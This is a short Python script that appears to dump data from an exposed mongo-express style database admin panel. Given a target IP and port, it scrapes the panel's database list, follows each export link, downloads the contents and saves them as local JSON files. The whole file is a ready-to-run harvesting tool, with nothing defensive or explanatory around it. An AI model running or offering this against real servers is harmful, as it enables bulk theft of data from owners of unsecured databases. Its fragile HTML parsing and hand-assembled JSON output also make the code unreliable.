import os, requests

class MongoDB:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

        self.url = f"http://{ip}:{port}"
        self.databases = []

        self.data = {}


    def fetch_json(self):
        for db in self.databases:
            response = requests.get(f"{self.url}{db}")
            if response.status_code != 200:
                continue

            html = response.text
            lines = html.split("\n")
            for line in lines:
                if db in line and "a href" in line and "exp" in line:
                    link = line.split("<a href=\"")[1].split("\" class=")[0].replace(" ","")
                    # Try fetching the data
                    try: 
                        data = requests.get(f"{self.url}{link}")
                        self.data[db] = data.text
                    except Exception as e:
                        print(f"Error {e} when handling {link}")


    def parse_databases(self, html):
        directories = []
        outer_list = html.split("ul")
        for i in outer_list:
            if 'class="dropdown-menu"' in i:
                for item in i.split('<li><a href="'):
                    if "class" not in item:
                        directories.append(item.split('"')[0])

        self.databases = directories
        return 0


    def scrape(self):
        response = requests.get(self.url)
        if response.status_code == 200:
            self.parse_databases(response.text)
            return 0

        print(self.ip, response)
        return 1


    def save_data(self):
        try:
            if not os.path.isdir("data"):
                os.mkdir("data")
        except Exception as e:
            print("Problem saving the data: ", e)

        for database in self.data:
            try:
                with open(f'data/{database.replace("/", "_")[1:]}.json', "w+", encoding="utf-8") as file:
                    file.write("{"); file.write(f"\" {database}\" : \n"); 
                    file.write(f"\t{self.data[database]}\n")
                    file.write("}")
            except UnicodeDecodeError:
                print("Problem writing", database, UnicodeDecodeError)

# Example flow:
def main():
    # Create a new target:
    database = MongoDB("192.168.0.123", "8081")
    # Scrape the databases to fetch:
    database.scrape()
    # Fetch all the data from the databases:
    database.fetch_json()
    # Save all of the data into files, data/{db_name}
    database.save_data()

if __name__ == "__main__":
    main()
